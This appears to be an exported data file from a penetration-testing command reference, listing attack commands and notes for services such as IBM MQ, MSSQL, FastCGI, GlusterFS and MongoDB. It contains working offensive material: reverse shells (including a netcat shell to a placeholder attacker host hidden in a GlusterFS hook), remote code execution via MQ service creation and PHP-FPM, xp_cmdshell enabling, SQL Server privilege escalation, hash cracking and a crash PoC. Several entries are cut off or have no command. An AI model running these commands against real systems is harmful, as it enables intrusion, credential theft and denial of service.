commands.note: After connecting, send the server's banner back, then send '#list' to enumerate available modules (shares). Modules requiring auth reply with AUTHREQD.

commands.name: nmap rsync module list
commands.note: Enumerates available rsync modules; check output for modules without password protection.

commands.name: Metasploit rsync module list
commands.note: Lists rsync modules via Metasploit scanner; some modules may be hidden and require direct access attempts.

commands.name: rsync list modules IPv6/alt port
commands.note: Enumerates rsync modules on IPv6 hosts or alternate ports.

commands.name: rsync list shared folder
commands.note: Lists contents of a specific rsync module/share without authentication; check for sensitive files.

commands.name: rsync download shared folder
commands.note: Recursively downloads all files from the share preserving attributes and permissions.

commands.name: rsync list with credentials
commands.note: Lists share contents with authentication; password prompt will appear.

commands.name: rsync download with credentials
commands.note: Downloads share with authentication; recursively transfers all files.

commands.name: rsync upload SSH authorized_keys
commands.note: Uploads an authorized_keys file to gain SSH access; requires write permission on the rsync module.

commands.name: Find rsyncd config files
commands.note: Locates rsyncd configuration and secrets files; the secrets file contains usernames and passwords for rsync authentication.

rusersd.name: Rusersd
rusersd.description: Rusersd is a Unix RPC service that provides information about users currently logged into the system. It can be used by attackers to enumerate valid usernames and active sessions on a target host.

commands.name: Install and run rusers
commands.note: Lists users logged into the remote host including terminal, login time, and idle time; useful for identifying active accounts and session times.

socks.name: SOCKS
socks.description: SOCKS is a network proxy protocol operating at Layer 5, with SOCKS5 adding optional authentication. Exposed SOCKS proxies can be abused for pivoting into internal networks, anonymizing traffic, or relay attacks.

commands.name: nmap SOCKS auth info
commands.note: Reveals what authentication methods the SOCKS server requires; no-auth means open proxy.

commands.name: nmap SOCKS brute-force basic
commands.note: Brute-forces SOCKS5 credentials using nmap's default wordlists.

commands.name: nmap SOCKS brute-force advanced
commands.note: Brute-forces with custom wordlists and time limit; output shows valid credentials.

commands.name: hydra SOCKS5 brute-force
commands.note: Brute-forces SOCKS5 credentials using hydra with 16 parallel threads.

commands.name: nmap SOCKS methods and open-proxy
commands.note: socks-methods lists supported auth types; socks-open-proxy confirms if the service can be abused as an open relay.

commands.name: Raw SOCKS5 handshake check
commands.note: Response \x05\x01\x00 means no-auth SOCKS5 (open proxy); \x05\x00\x02 means username/password required.

commands.name: curl egress validation (no auth)
commands.note: Validates the proxy provides external reach; socks5-hostname forces remote DNS resolution preventing leaks.

commands.name: curl egress validation (with auth)
commands.note: Tests proxy access to internal targets with credentials; useful to verify internal network reach.

commands.name: masscan SOCKS discovery
commands.note: Internet-wide scan for SOCKS proxies; filter banner strings like '3proxy', 'Dante', 'MikroTik' for prioritization.

ibmmq.name: IBM MQ
ibmmq.description: IBM MQ is a message broker for reliable messaging between applications. It can be exploited through unauthenticated channel access, PCF command abuse, and the MQSC REST API to read/inject messages, enumerate queues, and achieve remote code execution via service creation.

commands.name: punch-q Docker setup
commands.note: Launches the punch-q exploitation tool in Docker; no local IBM MQ libraries needed.

commands.name: punch-q discover queue manager name
commands.command: sudo docker run --rm -ti leonjza/punch-q --host {IP} --port {PORT} discover name
commands.note: Enumerates the Queue Manager name without credentials; often exposed without authentication.

commands.name: punch-q discover channels
commands.command: sudo docker run --rm -ti leonjza/punch-q --host {IP} --port {PORT} --username {USER} --password {PASS} discover channels
commands.note: Brute-forces channel names using an internal wordlist; 'authorised' means accessible, 'not authorised' means it exists but is restricted.

commands.name: punch-q show channels
commands.command: sudo docker run --rm -ti leonjza/punch-q --host {IP} --port {PORT} --username {USER} --password {PASS} --channel DEV.ADMIN.SVRCONN show channels -p '*'
commands.note: Lists all channels with type, MCA UID, connection name, and SSL cipher information.

commands.name: CHLAUTH RUNCHECK via MQSC
commands.command: echo "DISPLAY CHLAUTH(DEV.ADMIN.SVRCONN) MATCH(RUNCHECK) CLNTUSER('{USER}') ADDRESS('{IP}')" | runmqsc MYQUEUEMGR
commands.note: Determines which CHLAUTH rule applies to a remote connection; identifies cause of 2035 (unauthorized) errors.

commands.name: CHLAUTH RUNCHECK via REST API
commands.command: curl -sku '{USER}:{PASS}' -H 'ibm-mq-rest-csrf-token: anything' -H 'Content-Type: text/plain;charset=utf-8' --data "DISPLAY CHLAUTH(DEV.ADMIN.SVRCONN) MATCH(RUNCHECK) CLNTUSER('{USER}') ADDRESS('{IP}')" https://{IP}:9443/ibmmq/rest/v3/admin/action/qmgr/MYQUEUEMGR/mqsc
commands.note: Remote CHLAUTH check via the REST admin API on port 9443; useful when 1414 is filtered.

commands.name: Check OAM permissions via MQSC
commands.command: echo "DISPLAY AUTHREC PROFILE(SYSTEM.ADMIN.COMMAND.QUEUE) OBJTYPE(QUEUE) PRINCIPAL('{USER}')" | runmqsc MYQUEUEMGR
commands.note: Shows OAM permissions for a principal on key system objects; PCF admin needs access to SYSTEM.ADMIN.COMMAND.QUEUE.

commands.name: dspmqaut permissions check
commands.note: Checks effective OAM permissions on the MQ host directly; equivalent to DISPLAY AUTHREC without MQSC.

commands.name: punch-q show queues
commands.command: sudo docker run --rm -ti leonjza/punch-q --host {IP} --port {PORT} --username {USER} --password {PASS} --channel DEV.ADMIN.SVRCONN show queues -p '*'
commands.note: Lists all queues with type, usage, depth, and description; identifies queues worth monitoring or dumping.

commands.name: punch-q sniff messages
commands.command: sudo docker run --rm -ti leonjza/punch-q --host {IP} --port {PORT} --username {USER} --password {PASS} --channel DEV.ADMIN.SVRCONN messages sniff
commands.note: Non-destructively sniffs messages from queues; iterate over all identified queues.

commands.name: punch-q dump messages
commands.command: sudo docker run --rm -ti leonjza/punch-q --host {IP} --port {PORT} --username {USER} --password {PASS} --channel DEV.ADMIN.SVRCONN messages dump
commands.note: Dumps messages from queues; non-destructive operation.

commands.name: REST API browse message
commands.note: Non-destructively browses the next message in a queue via the messaging REST API.

commands.name: REST API destructive get message
commands.note: Destructively removes the next message from the queue via REST API.

commands.name: REST API inject message
commands.note: Injects a forged message into a queue; useful for message tampering and downstream service exploitation.

commands.name: punch-q RCE execute command
commands.command: sudo docker run --rm -ti leonjza/punch-q --host {IP} --port {PORT} --username {USER} --password {PASS} --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
commands.note: Achieves RCE via MQCMD_CREATE_SERVICE PCF command; execution is asynchronous so a listener or file-write payload is needed to confirm.

commands.name: punch-q reverse shell
commands.command: sudo docker run --rm -ti leonjza/punch-q --host {IP} --port {PORT} --username {USER} --password {PASS} --channel DEV.ADMIN.SVRCONN command reverse -i {IP} -p 4444
commands.note: Sends a bash or perl reverse shell payload via PCF service creation; set up a listener on the specified port first.

commands.name: REST API RCE define service
commands.command: curl -sku '{USER}:{PASS}' -H 'ibm-mq-rest-csrf-token: anything' -H 'Content-Type: text/plain;charset=utf-8' --data "DEFINE SERVICE(HACKTRICKS) CONTROL(MANUAL) SERVTYPE(COMMAND) STARTCMD('/bin/sh') STARTARG('-c id >/tmp/mq.id')" https://{IP}:9443/ibmmq/rest/v3/admin/action/qmgr/MYQUEUEMGR/mqsc
commands.note: Creates an MQ service via REST API that runs an OS command; follow up with START SERVICE and DELETE SERVICE commands.

commands.name: REST API start service
commands.note: Starts the previously defined MQ service to trigger command execution.

commands.name: REST API token login
commands.note: Authenticates and stores the LtpaToken2 cookie for subsequent requests; valid for 120 minutes by default.

commands.name: IBM MQ Docker test environment
commands.command: sudo docker pull icr.io/ibm-messaging/mq:latest && sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:latest
commands.note: Sets up a local IBM MQ instance for testing; exposes ports 1414 (MQ), 9157 (Prometheus), 9443 (web console).

mssql.name: MSSQL
mssql.description: Microsoft SQL Server is a widely deployed relational database that supports OS command execution via xp_cmdshell, NTLM hash capture via UNC paths, linked server pivoting, and multiple privilege escalation paths. Compromising MSSQL often leads directly to OS-level access.

commands.name: nmap MSSQL full scan
commands.note: Comprehensive MSSQL enumeration; checks empty password, xp_cmdshell, NTLM info, tables, hashes.

commands.name: Metasploit MSSQL ping
commands.note: Discovers MSSQL instances and their configuration details.

commands.name: nxc RID brute-force user enumeration
commands.note: Enumerates domain/local users by brute-forcing RIDs through MSSQL; useful with limited privileges.

commands.name: mssqlpwner brute-force
commands.note: Brute-forces MSSQL credentials across multiple hosts; also supports hashes and Kerberos tickets.

commands.name: impacket mssqlclient connect
commands.note: Interactive MSSQL shell via impacket; add -windows-auth for domain authentication.

commands.name: sqsh connect
commands.note: Alternative MSSQL client; use GO after each query to execute. For local users: sqsh -S {IP} -U .\\{USER} -P {PASS}

commands.name: Get version
commands.note: Returns SQL Server version string including build number and OS; run inside MSSQL session.

commands.name: List databases
commands.note: Lists all databases on the server instance.

commands.name: List users and logins
commands.command: select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
commands.note: Lists all SQL logins with their password hashes and status.

commands.name: List linked servers
commands.note: Lists linked SQL servers; linked servers may allow cross-server query execution and privilege escalation.

commands.name: Get my server permissions
commands.note: Shows all server-level permissions for the current login.

commands.name: Check sysadmin membership
commands.note: Returns 1 if current user is sysadmin, 0 otherwise.

commands.name: crackmapexec xp_cmdshell
commands.note: Executes OS commands via xp_cmdshell through CME; use -X for PowerShell commands, -H for hash auth.

commands.name: Enable xp_cmdshell
commands.command: EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
commands.note: Enables xp_cmdshell in one line; requires sysadmin or EXECUTE permission on xp_cmdshell.

commands.name: Execute OS command via xp_cmdshell
commands.note: Runs OS commands as the SQL Server service account; SeImpersonatePrivilege is typically enabled.

commands.name: xp_cmdshell reverse shell
commands.note: Downloads and executes a PowerShell reverse shell payload via xp_cmdshell.

commands.name: mssqlpwner custom assembly RCE
commands.note: Executes commands via custom .NET assembly; works even without xp_cmdshell.

commands.name: mssqlpwner linked server exec
commands.note: Executes commands on a linked server via stored procedures; useful for cross-server pivoting.

commands.name: NTLM hash capture via xp_dirtree
commands.note: Forces the SQL Server service account to authenticate to an attacker SMB server; capture hash with Responder or impacket-smbserver.

commands.name: mssqlpwner NTLM relay
commands.note: Issues NTLM relay attack from MSSQL; also supports targeting linked servers with -link-name.

commands.name: Read file via OPENROWSET BULK
commands.command: SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
commands.note: Reads local files as the SQL Server service account; requires ADMINISTER BULK OPERATIONS permission.

commands.name: Python external script execution
commands.note: Executes Python code if ML Services is enabled; runs as a different user than xp_cmdshell.

commands.name: Read Windows registry
commands.note: Reads Windows registry values via extended stored procedures; useful for finding credentials and configuration.

commands.name: Forge silver ticket for MSSQL
commands.note: Forges a silver ticket for MSSQL SPN with injected group RID for sysadmin access; requires service account NTLM hash.

commands.name: Enumerate linked server logins
commands.note: Shows linked server login mappings; a low-priv login mapped to a sysadmin on the remote side enables RCE.

commands.name: Enable xp_cmdshell on linked server
commands.command: EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{SHARE}]; EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{SHARE}]; EXEC ('EXEC xp_cmdshell ''whoami''') AT [{SHARE}];
commands.note: Enables and uses xp_cmdshell on a linked server; {SHARE} is the linked server name.

commands.name: Find impersonatable logins
commands.command: SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
commands.note: Lists logins that the current user can impersonate; look for sa or other high-privilege accounts.

commands.name: Impersonate sa login
commands.command: EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
commands.note: Impersonates the sa account if IMPERSONATE permission is granted; confirms sysadmin access.

commands.name: Find trustworthy databases
commands.command: SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;
commands.note: Finds databases with TRUSTWORTHY enabled; if you are db_owner of one owned by sysadmin you can escalate.

commands.name: db_owner to sysadmin escalation
commands.command: USE <trustworthy_db>; CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '{USER}','sysadmin'; EXEC sp_elevate_me; SELECT is_srvrolemember('sysadmin');
commands.note: Creates and executes a stored procedure that runs as the database owner (sysadmin) to add your user to sysadmin.

commands.name: Metasploit db_owner escalation
commands.note: Automatically exploits db_owner to sysadmin escalation via trustworthy databases.

commands.name: Metasploit IMPERSONATE escalation
commands.note: Exploits IMPERSONATE privileges to escalate to sysadmin.

commands.name: Dump password hashes
commands.note: Retrieves SQL Server login password hashes; requires sysadmin privileges.

commands.name: WMI remote SQL collection
commands.command: wmic /node:{IP} /user:{DOMAIN}\{USER} /password:{PASS} process call create "cmd.exe /c sqlcmd -S {IP} -U {USER} -P {PASS} -Q \"SELECT name FROM sys.databases\" -o C:\\Windows\\Temp\\out.csv"
commands.note: Pivots from IIS/app tier to SQL Server using WMI to execute sqlcmd; blends with admin activity.

oracle.name: Oracle
oracle.description: Oracle Database uses the TNS Listener for network connections. Pentesting involves enumerating the TNS version, brute-forcing SIDs (database instance names), and then attacking credentials to gain database access and potentially OS command execution.

commands.name: nmap Oracle TNS version
commands.note: Enumerates the Oracle TNS Listener version; useful for identifying known CVEs and vulnerabilities.

commands.name: odat all enumeration
commands.note: Runs all odat modules against the Oracle listener including SID enumeration, credential brute-force, and privilege checks.

pptp.name: PPTP
pptp.description: PPTP is a legacy VPN protocol using TCP/1723 for control and GRE (protocol 47) for data. Its reliance on MS-CHAPv2 authentication makes captured handshakes vulnerable to offline cracking, and recovered NT hashes can be reused for Windows authentication.

commands.name: nmap PPTP service scan
commands.note: Detects PPTP service on TCP/1723; confirms the control channel is open.

commands.name: nmap GRE protocol check
commands.note: Checks if GRE (IP protocol 47) is accessible; PPTP tunnel will fail even with open TCP/1723 if GRE is filtered.

commands.name: tcpdump capture PPTP handshake
commands.command: sudo tcpdump -ni {IP} 'tcp port 1723 or gre' -w pptp-handshake.pcap
commands.note: Captures both PPTP control channel and GRE-encapsulated traffic for offline analysis.

commands.name: tshark filter PPTP traffic
commands.note: Filters a packet capture for PPTP, GRE, PPP, and CHAP frames to find the MS-CHAPv2 handshake.

commands.name: tshark filter CHAP only
commands.note: Isolates CHAP authentication exchange to extract challenge/response material for offline cracking.

commands.name: chapcrack parse handshake
commands.note: Parses MS-CHAPv2 material from a packet capture; extracts challenge/response pairs for cracking.

commands.name: chapcrack decrypt capture
commands.note: Decrypts the PPTP session after recovering the NT hash or secret material; useful for post-auth traffic analysis.

commands.name: hashcat crack MS-CHAPv2
commands.note: Cracks NetNTLMv1/ESS hashes from MS-CHAPv2 material; format: <user>::<domain>:<peer_challenge>:<nt_response>:<auth_challenge>.

commands.name: asleap crack MS-CHAPv2
commands.note: Cracks MS-CHAPv2 challenge/response pairs using dictionary attack; -C is the challenge, -R is the response.

commands.name: assless-chaps NT hash recovery
commands.note: Recovers the NT hash directly from MS-CHAPv2/NTLMv1 challenge-response using a precomputed hash database; faster than password cracking.

mqtt.name: MQTT
mqtt.description: MQTT is a lightweight publish/subscribe protocol designed for IoT and M2M communications. Authentication is optional and encryption is not used by default, making it susceptible to unauthenticated message interception, credential sniffing, and cross-tenant topic injection attacks.

commands.name: mosquitto_sub subscribe to all topics
commands.note: Subscribes to ALL topics (# wildcard) on the broker; captures all messages published by any client.

commands.name: mosquitto_sub specific topic
commands.note: Subscribes to a specific topic; replace with discovered topic paths.

commands.name: mosquitto_sub with auth
commands.note: Subscribes to potentially sensitive admin topics with credentials; look for Wi-Fi credentials, device configs, or control commands.

commands.name: mosquitto_pub cross-tenant injection
commands.note: Injects commands to another tenant's device when topic ACLs only check deviceId; tests for broken access control.

commands.name: mosquitto install clients
commands.note: Installs mosquitto client tools for MQTT interaction.

nfs.name: NFS
nfs.description: NFS allows remote file system access over a network using Unix UID/GID for authorization. Misconfigurations like no_root_squash, disabled subtree_check, or overly permissive exports enable attackers to read sensitive files, escalate privileges, and potentially achieve root access.

commands.name: showmount list exports
commands.note: Lists available NFS exports and which hosts/networks are allowed to mount them; works for NFSv3.

commands.name: nmap NFS scripts
commands.note: nfs-ls lists exports and permissions, nfs-showmount shows exports, nfs-statfs shows disk statistics.

commands.name: Metasploit NFS mount scan
commands.note: Scans NFS mounts and lists permissions; useful as an alternative to showmount when direct queries are restricted.

commands.name: Mount NFS share
commands.note: Mounts an NFS share locally; using version 2 avoids authentication requirements. Create mount point first with mkdir.

commands.name: Mount NFS share example

splunk.name: Splunk
splunk.description: Splunk is a log analytics and SIEM platform. The splunkd management API on port 8089 with default or weak credentials (admin:changeme) allows RCE via custom application deployment with scripted inputs running Python, Bash, or PowerShell.

commands.name: Splunk Windows PowerShell reverse shell payload
commands.note: PowerShell reverse shell for Splunk custom app bin/run.ps1; triggered by inputs.conf with disabled=0 and interval=10

commands.name: Splunk Linux Python reverse shell payload
commands.command:
python3 -c "
import sys, socket, os, pty
ip = '{IP}'
port = '443'
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]

"

bitcoin.name: Bitcoin
bitcoin.description: Bitcoin peer-to-peer network nodes communicate over these ports (mainnet/testnet/signet/regtest). Exposed nodes can be queried for network topology, node software versions, and peer lists without authentication.

commands.name: Nmap bitcoin-info + bitcoin-getaddr
commands.note: Retrieves node version, network (main/test/regtest), last block height, user agent string, and a list of known peer addresses.

commands.name: Nmap bitcoin-getaddr only

fastcgi.name: FastCGI
fastcgi.description: FastCGI (often PHP-FPM) is a binary protocol for running CGI applications; when directly reachable it allows arbitrary PHP code execution by setting PHP_VALUE parameters, and is also exploitable via SSRF using the gopher scheme.

commands.name: Port scan FastCGI
commands.note: FastCGI often shows as 'unknown' service; confirms port is open for further manual testing.

commands.name: Probe FPM status page via cgi-fcgi
commands.note: Fetches the php-fpm status page (pm.status_path). Confirms FastCGI is reachable and shows pool stats.

commands.name: FastCGI RCE via cgi-fcgi (bash script)
commands.command:
#!/bin/bash
PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php"
HOST={IP}
B64=$(echo "$PAYLOAD"|base64)
for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT
    cat $OUTPUT
done
commands.note: Requires cgi-fcgi utility and a known existing PHP file path on the server. PHP_VALUE overrides prepend a base64-encoded payload before the target script.

commands.name: FastCGI RCE via SSRF/gopher (Python payload builder)
commands.command:
python3 - <<'EOF'
import struct, socket
host, port = "{IP}", 9000
params = {
    b"REQUEST_METHOD": b"POST",
    b"SCRIPT_FILENAME": b"/var/www/html/index.php",
    b"PHP_VALUE": b"auto_prepend_file=php://input\nallow_url_include=1"
}
body = b"<?php system('id'); ?>"

def rec(rec_type, content, req_id=1):
    return struct.pack("!BBHHBB", 1, rec_type, req_id, len(content), 0, 0) + content

def enc_params(d):
    out = b""
    for k, v in d.items():
        out += struct.pack("!B", len(k)) + struct.pack("!B", len(v)) + k + v
    return out
payload  = rec(4, enc_params(params)) + rec(4, b"")
payload += rec(5, body)

s = socket.create_connection((host, port))
s.sendall(payload)
print(s.recv(4096))
EOF
commands.note: Builds and sends a raw FastCGI request over TCP. Useful when port is not directly reachable; convert payload bytes to gopher:// URL for SSRF exploitation.

hsqldb.name: HSQLDB
hsqldb.description: HSQLDB is a Java relational database often embedded in applications; its default credentials (sa/blank) and Java Language Routines feature allow attackers to read system properties and write arbitrary files, leading to RCE.

commands.name: Search for HSQLDB credentials in config files
commands.note: Look for JDBC connection strings with embedded passwords in application config files; note the database name for use in the connection URL.

commands.name: Connect via HSQLDB GUI
commands.note: Launch the HSQLDB GUI tool. Connect using jdbc:hsqldb:hsql://{IP}/DBNAME with discovered credentials. Default creds: sa / (blank password).

commands.name: Read Java system property via JRT function
commands.note: Run inside an HSQLDB SQL session. Reveals JVM system properties such as user.name, java.home, file.separator, etc.

commands.name: Write file via JRT procedure
commands.note: Writes hex-encoded bytes to a file path on the server. Maximum 1024 bytes. Use to drop a JSP web shell if the app server's webroot is writable.

pjl.name: PJL
pjl.description: Port 9100 is the raw printing/JetDirect port used by network printers; it accepts PJL, PostScript, and PCL commands that can enumerate printer internals, read/write the filesystem, and in some firmware versions achieve RCE via font parsing bugs.

commands.name: Manual PJL enumeration via netcat
commands.note: After connecting, send PJL commands: @PJL INFO ID (brand/version), @PJL INFO STATUS, @PJL INFO PRODINFO, @PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535 (list filesystem), @PJL INFO VARIABLES (env vars).

commands.name: Nmap PJL ready message
commands.note: Retrieves the printer's ready message, which may include model and firmware version.

commands.name: Metasploit PJL env vars
commands.note: Enumerates PJL environment variables from the target printer.

commands.name: Metasploit PJL list directory
commands.note: Lists the printer's internal filesystem directories.

commands.name: Metasploit PJL list volumes
commands.note: Enumerates available storage volumes on the printer.

commands.name: Metasploit PJL ready message
commands.note: Reads the current printer ready message.

commands.name: Metasploit PJL version info
commands.note: Retrieves firmware/version information from the printer.

commands.name: Metasploit PJL download file
commands.note: Downloads a file from the printer's internal filesystem via PJL FSUPLOAD.

commands.name: Metasploit PJL upload file
commands.note: Uploads a file to the printer's internal filesystem via PJL FSDOWNLOAD.

commands.name: Metasploit PJL delete file
commands.note: Deletes a file from the printer's internal filesystem via PJL FSDELETE.

commands.name: Send XPS exploit with malicious TTF (Canon RCE)
commands.command: { printf "@PJL ENTER LANGUAGE = XPS\r\n"; cat exploit.xps; } | nc -q0 {IP} 9100
commands.note: Exploits Canon ImageCLASS TrueType VM hinting bytecode bugs (CINDEX/DELTAP1) to achieve RCE. exploit.xps must be a valid XPS ZIP containing a malicious TTF in /Resources/.

elasticsearch.name: Elasticsearch
elasticsearch.description: Elasticsearch is a distributed REST-based search and analytics engine; by default it lacks authentication, exposing all indexed data (often including credentials, PII, and logs) to unauthenticated HTTP requests.

commands.name: Check authentication status
commands.note: If response is HTTP 500 with 'Security must be explicitly enabled', auth is off. If HTTP 401 with WWW-Authenticate, credentials are required.

commands.name: Authenticated access
commands.note: Basic auth. Default users: elastic, kibana, logstash_system, beats_system. Older versions used 'changeme' as default password.

commands.name: List all roles
commands.note: Lists all security roles defined on the instance.

commands.name: List all users
commands.note: Lists all users. Identify which user has the 'superuser' role.

commands.name: Get user details
commands.note: Returns roles and metadata for a specific user.

commands.name: List all indices
commands.note: Shows all index names with health status, document count, and store size. Look for indices containing sensitive data names.

commands.name: Dump index contents
commands.note: Dumps all documents from a specific index. Default limit is 10 results; use size= parameter to retrieve more.

commands.name: Dump all indices
commands.note: Dumps documents across all indices. Default limit of 10 applies; increase size parameter.

commands.name: Search across all indices
commands.note: Full-text search across all indices. The q parameter supports regular expressions.

commands.name: Check write permissions
commands.note: Attempts to create a new document in a new index. Success confirms write access.

commands.name: Metasploit indices enumeration
commands.note: Automatically enumerates Elasticsearch indices.

commands.name: Cluster health
commands.note: Returns cluster status, number of nodes, shards. Also try /_nodes, /_cluster/stats.

ndmp.name: NDMP
ndmp.description: NDMP is used to transport data between NAS devices and backup systems; exposing it externally may reveal filesystem information and allow unauthorized backup operations.

commands.name: Nmap NDMP version and filesystem info
commands.note: Runs both ndmp-fs-info and ndmp-version scripts to retrieve protocol version and filesystem/volume information from the backup service.

memcache.name: Memcache
memcache.description: Memcached is an in-memory key-value cache commonly used to accelerate web applications; it typically has no authentication, allowing any network-reachable client to read, write, and delete all cached data including session tokens and credentials.

commands.name: Get version
commands.note: Returns the Memcached version string.

commands.name: Get stats
commands.note: Returns server statistics including uptime, connections, bytes read/written, hits/misses.

commands.name: Get slab info
commands.note: Lists active slab classes with chunk sizes and usage. Identify which slabs have items.

commands.name: Get items per slab
commands.note: Shows item counts and metadata per slab class. Use slab numbers to target cachedump.

commands.name: Dump key names from slab
commands.note: Returns key names stored in the given slab class. 0 means unlimited output. Use for versions < 1.4.31.

commands.name: Get item value by key
commands.note: Retrieves the cached value for a specific key. May contain session tokens, credentials, or application data.

commands.name: PHP getAllKeys dump
commands.note: Requires php-memcached extension (sudo apt-get install php-memcached). Dumps all key names; follow up with get commands.

commands.name: libmemcached stats
commands.note: Requires libmemcached-tools (sudo apt install libmemcached-tools). Returns server statistics.

commands.name: libmemcached dump all keys
commands.note: Dumps all key names from the server. Follow up with memccat to retrieve values.

commands.name: libmemcached get item values
commands.note: Retrieves and displays the values stored under the specified keys.

commands.name: Nmap memcached info
commands.note: Gathers server version, stats, and slab information via nmap.

commands.name: Metasploit memcached extractor
commands.note: Automatically extracts all saved data from a Memcached instance.

commands.name: Metasploit UDP amplification check
commands.note: Checks if the instance is vulnerable to UDP DDoS amplification attacks.

commands.name: LRU crawler metadump (v1.4.31+)
commands.note: Non-blocking key dump for Memcached 1.4.31+. Produces extensive output; pipe to grep to filter specific keys.

rabbitmq.name: RabbitMQ
rabbitmq.description: Port 15672 hosts the RabbitMQ Management web console and REST API; default credentials (guest/guest) frequently remain unchanged, allowing full message broker control including publishing arbitrary messages to queues.

commands.name: Enable management plugin
commands.command: rabbitmq-plugins enable rabbitmq_management && service rabbitmq-server restart
commands.note: Run on the server to enable the management interface if not already active.

commands.name: List connections via API
commands.note: Returns current connections including client IPs, user names, and channel details. Default creds: guest/guest.

commands.name: Publish message to queue via API
commands.note: Publishes a crafted message into a queue using the management REST API. Useful for injecting payloads into message consumers.

commands.name: Crack RabbitMQ password hash
commands.command: echo {HASH_BASE64} | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt && hashcat -m 1420 --hex-salt hash.txt wordlist
commands.note: RabbitMQ stores passwords as SHA-256(salt+password). Extract the hash from the management API or config, convert to hashcat format, then crack with mode 1420.

glusterfs.name: GlusterFS
glusterfs.description: GlusterFS is a distributed file system whose management daemon on port 24007 typically requires no authentication; attackers can enumerate volumes, mount file systems directly, and escalate privileges via the world-readable gluster_shared_storage admin volume.

commands.name: Install GlusterFS client tools
commands.note: Required on attacking machine before running gluster commands.

commands.name: Peer status discovery
commands.note: Lists cluster peers and their connection state. Works without authentication in default setups.

commands.name: Volume reconnaissance
commands.note: Retrieves all volume names, brick paths, transport type, and options. Look for gluster_shared_storage and TLS/auth settings.

commands.name: Mount volume
commands.note: Mounts a GlusterFS volume directly. Fails if TLS is enforced or CIDR auth.allow is set. Check /var/log/glusterfs/ for errors.

commands.name: Mount admin volume and drop privilege-escalation hook
commands.command:
mkdir /tmp/gss && sudo mount -t glusterfs {IP}:/gluster_shared_storage /tmp/gss && cat <<'EOF' > /tmp/gss/hooks/1/start/post/test.sh
#!/bin/bash
nc -e /bin/bash {ATTACKER_IP} 4444 &
EOF
chmod +x /tmp/gss/hooks/1/start/post/test.sh
commands.note: Exploits world-readable gluster_shared_storage to write a root-executing hook script that gets distributed cluster-wide. Related to CVE-2023-3775 (< 10.5/11.1).

commands.name: Enable TLS for volume (hardening/detection check)
commands.note: Check if TLS is already set on volumes to understand access controls.

commands.name: CVE-2023-26253 DoS PoC
commands.command:
python3 - <<'EOF'
import socket, xdrlib, struct
p = xdrlib.Packer(); p.pack_uint(0xdeadbeef)
with socket.create_connection(("{IP}", 24007)) as s:
    s.send(struct.pack("!L", len(p.get_buffer())|0x80000000))
    s.send(p.get_buffer())
EOF
commands.note: Sends a malformed NOTIFY_REPLY XDR frame to crash glusterfsd < 11.0 (CVE-2023-26253). Remote DoS.

mongodb.name: MongoDB
mongodb.description: MongoDB is a document-oriented NoSQL database that historically ran without authentication by default, exposing all databases to unauthenticated reads and writes; it is also affected by MongoBleed (CVE-2025-14847), a pre-auth heap memory disclosure via the zlib compressor.

commands.name: Nmap MongoDB enumeration
commands.note: Runs all default nmap MongoDB scripts to enumerate server version, database names, and check authentication.

commands.name: Nmap MongoDB brute force
commands.note: Checks if credentials are required and attempts brute force. Confirms open access if no auth is configured.

commands.name: Connect without credentials
commands.note: Connects to MongoDB without authentication. Succeeds when auth is disabled (default in many versions).

commands.name: Connect with port and database
commands.note: Connects to a specific database on a non-default port.

commands.name: Connect with credentials
commands.note: Authenticates against the specified database. Try 'admin' as the database.

commands.name: PyMongo enumeration
commands.command:
python3 -c "
from pymongo import MongoClient
client = MongoClient('{IP}', 27017, username='{USER}', password='{PASS}')
print(client.server_info())
for db in client.list_databases():
    print(db)
    print(client[db['name']].list_collection_names())
"
commands.note: Python-based enumeration of databases and collections. Omit username/password for unauthenticated access.

commands.name: MongoDB shell: list databases
commands.note: Run inside the mongo shell. Lists all databases with their sizes.

commands.name: MongoDB shell: dump collection
commands.note: Dumps all documents from a collection. Also use db.{COLLECTION}.count() for record counts.

commands.name: MongoDB shell: search collection
commands.note: Finds documents matching a query filter. Useful for locating specific user records or credentials.

commands.name: Check noauth config
commands.note: Run on the server to confirm auth is disabled in the MongoDB configuration.

commands.name: Check networkMessageCompressors (MongoBleed)
commands.note: Checks if zlib compressor is enabled, which is required for CVE-2025-14847 (MongoBleed) exploitation.

commands.name: MongoBleed heap leak PoC
commands.note: CVE-2025-14847: Pre-auth heap memory disclosure affecting MongoDB 3.6-8.2 with zlib compression. Leaks heap data including credentials, session tokens, and API keys.

tiller-helm.name: Tiller (Helm)
